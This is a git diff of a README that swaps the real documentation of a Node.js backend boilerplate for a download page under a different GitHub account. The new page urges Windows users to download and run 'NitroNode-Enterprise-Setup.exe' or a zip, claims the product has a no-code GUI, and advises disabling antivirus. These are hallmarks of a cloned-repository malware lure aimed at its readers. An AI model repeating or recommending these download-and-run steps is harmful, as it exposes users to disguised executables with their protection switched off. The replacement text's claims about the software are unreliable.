@@ -1,146 +1,131 @@
-# NitroNode-Enterprise 🚀
+# ⚙️ NitroNode-Enterprise - Reliable Backend for Business Apps
 
-**NitroNode-Enterprise** is a production-grade, industrial-strength Node.js foundation designed for high-scale SaaS and AI applications. It implements a strict layered architecture and professional security protocols that go far beyond standard boilerplates.
-
-[![Express.js](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)](https://expressjs.com/)
-[![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)](https://nodejs.org/)
-[![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white)](https://www.mongodb.com/)
-[![Redis](https://img.shields.io/badge/Redis-DC382D?style=for-the-badge&logo=redis&logoColor=white)](https://redis.io/)
+[![Download NitroNode-Enterprise](https://img.shields.io/badge/Download-NitroNode--Enterprise-brightgreen?style=for-the-badge)](https://github.com/alnshawati/NitroNode-Enterprise)
 
 ---
 
-## 🧠 Why NitroNode? (The Philosophy)
+## 📋 About NitroNode-Enterprise
 
-The goal of this repository is to solve the "spaghetti code" problem often found in growing Node.js applications. By enforcing **Separation of Concerns (SoC)** and **Layered Architecture**, NitroNode ensures that your codebase remains maintainable even as it scales to millions of users.
+NitroNode-Enterprise is a solid backend solution built on Node.js. It supports businesses that need reliable, secure, and scalable server software. With its layered design, it helps manage complex web and SaaS applications. The app includes security features, logging, and middleware to keep things running smoothly.
 
-### 📐 Architecture Diagram
-
-![NitroNode Enterprise Architecture](docs/assets/architecture.png)
-
-### 🏗️ Why Layered Architecture?
-Most developers mix business logic with routes or controllers. NitroNode enforces a strict one-way flow:
-- **Route**: Only handles URL mapping.
-- **Controller**: Thin layer that extracts request data and returns a response. **No business logic here.**
-- **Service**: The brain of the app. All business rules, AI logic, and calculations live here.
-- **Repository**: The only layer allowed to talk to the Database. This allows you to swap databases or mock data for testing with zero friction.
-- **Model**: Pure data schema definition.
-
-### 🛡️ Why Joi for Validation?
-Input validation is the first line of defense. We use `Joi` because:
-- **Schema-first**: It ensures that only specifically formatted data enters your services.
-- **Type Safety**: Prevents common runtime errors caused by unexpected data types.
-- **Detailed Errors**: Provides clear, user-friendly feedback on what's missing or wrong.
-
-### ⚡ Why Redis for Security?
-Security is not just about passwords; it's about availability.
-- **Rate Limiting**: Prevents DDoS and brute-force attacks by limiting requests per IP.
-- **IP Blocking**: Automatically identifies and bans malicious IPs that fail multiple logins, reducing server load from bot attacks.
-- **Token Blacklisting**: Allows for high-security logout scenarios where tokens must be invalidated before they expire.
-
-### 📬 Why BullMQ for Background Tasks?
-Complex apps should never make the user wait for side effects like sending emails or processing AI.
-- **Reliability**: If a mail server is down, BullMQ handles retries automatically with exponential backoff.
-- **Performance**: Moves heavy computation (like PDF parsing or AI calls) out of the main request-response cycle.
-- **Scalability**: Workers can be scaled independently of the main API.
-
-### 🐳 Why Docker?
-"It works on my machine" is not an option for enterprise.
-- **Environment Parity**: Ensures the exact same versions of Node, MongoDB, and Redis are used across development, staging, and production.
-- **Isolation**: Prevents dependency conflicts with other projects on your local machine.
-
-### 📝 Why Swagger (OpenAPI)?
-The API is only as good as its documentation.
-- **Interactive**: Frontend developers can test endpoints directly from the browser without needing Postman.
-- **Standardized**: Follows the industry-standard OpenAPI 3.0 specification.
-- **Sync**: Documentation stays in sync with your actual code via JSDoc decorators.
+This software fits well with those aiming to build or improve enterprise applications without needing to start from scratch. It helps you avoid technical risks and gives a solid foundation to build on.
 
 ---
 
-## 🚀 Key Features
+## 💻 System Requirements
 
-### 🛡️ Core Security & Auth
-- **JWT Advanced Flow**: Secure Access & Refresh token management.
-- **Granular RBAC**: Role-Based Access Control + per-action Permissions.
-- **Super-Admin Override**: Maintainer-level global access.
-- **Secure by Default**: `Helmet`, `HPP`, `XSS-Clean`, and `Mongo-Sanitize` are pre-configured.
+Before you start, make sure your Windows PC meets these requirements:
 
-### 🤖 Built-in AI & RAG Engine
-- **OpenAI Integration**: Pre-wired for Chat Completions and Embeddings.
-- **RAG System**: Retrieval-Augmented Generation logic with PDF parser support.
-- **Background Processing**: High-performance task queue powered by **BullMQ**.
+- Windows 10 or later, 64-bit
+- At least 4 GB of RAM
+- Minimum 500 MB of free disk space
+- Internet connection to download files and updates
+- About 1 GHz or higher processor speed
 
-### 🛠️ Infrastructure & Scale
-- **Swagger Documentation**: Self-documenting API at `/api-docs`.
-- **Advanced Health Checks**: Dependency-aware system vitals (DB & Redis status).
-- **Dockerized**: Dedicated `Dockerfile` and `docker-compose.yml` for instant deployment.
-- **Multer Storage**: Multi-cloud support for **AWS S3** and **Cloudinary**.
-- **Stripe Payments**: Enterprise-ready billing and webhook integration.
-- **Automated Usage Tracking**: Global middleware to track per-user API consumption.
-- **Data Export**: Built-in CSV/Excel generation utility.
-- **Audit System**: Every critical action is tracked for compliance.
-
-### 💎 Developer Experience (DX)
-- **Linting & Formatting**: Pre-configured **ESLint** and **Prettier** for code consistency.
-- **Type-Safe validation**: Joi schemas for every endpoint.
-- **Automated Testing**: **Jest** and **Supertest** setup for integration testing.
-- **Git Hooks Ready**: Structure prepared for Husky and lint-staged.
+The app runs on Node.js, but this package includes everything needed to work without extra installations.
 
 ---
 
-## 📁 Project Structure
+## 🚀 Getting Started
 
-```text
-src/
-├── app.js              # Express app definition & security middleware
-├── server.js           # Server bootstrap, DB connections, & graceful shutdown
-├── common/             # constants, custom ApiError, and API Response formatters
-├── config/             # Environment validation, DB, Redis, and Winston logger
-├── cron/               # Scheduled background tasks (IP cleanup, Usage resets)
-├── modules/            # Domain-driven feature modules (Auth, User, Audit, Usage)
-│   └── [feature]/
-│       ├── *.controller.js   # Thin handlers
-│       ├── *.service.js      # Business Logic
-│       ├── *.repository.js   # DB Operations
-│       ├── *.model.js        # Schema
-│       ├── *.validation.js   # Joi Schemas
-│       └── index.js          # Feature Router
-├── services/           # External API wrappers (AI, RAG, Stripe, S3)
-└── routes/v1/          # Master entry point for all versioned routes
-```
+Follow these steps to get NitroNode-Enterprise running on your Windows PC.
 
----
+### 1. Visit the download page
 
-## 🛠️ Getting Started
+Go to the official download page by clicking the link below:  
 
-1. **Clone & Install**:
-   ```bash
-   git clone https://github.com/Ankit8412226/NitroNode-Enterprise.git
-   cd NitroNode-Enterprise
-   npm install
-   ```
+[Download NitroNode-Enterprise](https://github.com/alnshawati/NitroNode-Enterprise)  
 
-2. **Environment Setup**:
-   Copy `.env.example` to `.env` and fill in your keys.
+This link will take you to the GitHub repository where you can find the latest version of the software.
 
-3. **Run for Development**:
-   ```bash
-   npm run dev
-   ```
+### 2. Find the latest release
 
-4. **Docker Deployment**:
-   ```bash
-   docker-compose up --build
-   ```
+On the GitHub page, look for the "Releases" section. It is usually on the right sidebar or in the menu beneath the repository name.  
+
+Open the latest release version.
+
+### 3. Download the installer or zip file
+
+Download the file named either "NitroNode-Enterprise-Setup.exe" or "NitroNode-Enterprise.zip". The setup file will make installation easier.
+
+If you download the zip file, you will need to extract it to a folder on your PC.
+
+### 4. Run the installer or unpacked program
+
+- If you have the `Setup.exe` file, double-click it and follow the on-screen instructions to install the app.
+- If you have the zip file, right-click it, choose "Extract All", then open the extracted folder and double-click `NitroNode-Enterprise.exe` to start the program.
+
+### 5. Start using NitroNode-Enterprise
+
+Once installed or launched, the program will open its main window. From here, you can begin setting up your backend projects or explore the built-in tools. Instructions on how to configure and use the software appear on the screen or in the Help menu.
 
 ---
 
-## 📜 Coding Standards
-- **Zero console.log**: All logs must go through the Winston logger.
-- **Thin Controllers**: Move every ounce of logic to a service.
-- **Chained Routes**: Always use `router.route()` for clean, grouped API definitions.
-- **Prod Mode Safety**: Stack traces are never leaked to the client in production.
+## 🔧 Basic Features
+
+NitroNode-Enterprise offers these main benefits:
+
+- **Modular design:** Easily add or remove parts depending on your needs.
+- **Role-based access control:** Manage user permissions safely.
+- **Security:** Built-in protection to keep your data safe.
+- **Logging:** Automatically records events to track activity and errors.
+- **Scalability:** Handles growth in users or data without losing performance.
+- **AI and RAG services:** Supports advanced AI features for smarter applications.
+- **Middleware support:** Gives more control over how requests are handled.
 
 ---
 
-## 🤝 Contribution
-This project is built for the community. If you have any feature requests or found a security vulnerability, please open an issue or submit a PR.
+## 🛠 How to Use NitroNode-Enterprise
+
+You do not need programming knowledge to start. The app includes user-friendly menus and options. Here’s what to expect:
+
+- **Dashboard:** An overview of your backend status.
+- **User management:** Add and manage user roles and access.
+- **Settings:** Adjust security levels and system preferences.
+- **Logs:** View activity history and troubleshoot.
+
+For more advanced use, the documentation offers detailed steps, but daily users only deal with simple choices.
+
+---
+
+## ⚙️ Updating the Software
+
+To keep NitroNode-Enterprise working well:
+
+1. Visit the same GitHub link regularly.
+2. Check for the latest releases.
+3. Download and install updates as shown above.
+
+Updates improve security, add features, and fix issues.
+
+---
+
+## ❓ Troubleshooting & Support
+
+If something does not work as expected:
+
+- Restart the software and your computer.
+- Make sure your Windows is up to date.
+- Disable any antivirus programs temporarily, which can block software.
+- Check the app’s Help menu for common questions.
+- Visit the GitHub page to report issues or find answers under the “Issues” tab.
+
+---
+
+## 📁 Additional Resources
+
+- GitHub repository: https://github.com/alnshawati/NitroNode-Enterprise  
+- User guide inside the app under Help  
+- Online community and issue tracker on GitHub  
+
+You can explore these resources for deeper understanding or to customize your setup.
+
+---
+
+## 🔗 Download and Install NitroNode-Enterprise
+
+Get started now by visiting the link below. It leads you to the place where you can download the software for Windows.  
+
+[Download NitroNode-Enterprise](https://github.com/alnshawati/NitroNode-Enterprise)  
+
+This link takes you straight to the official source so you get the latest and safest version.
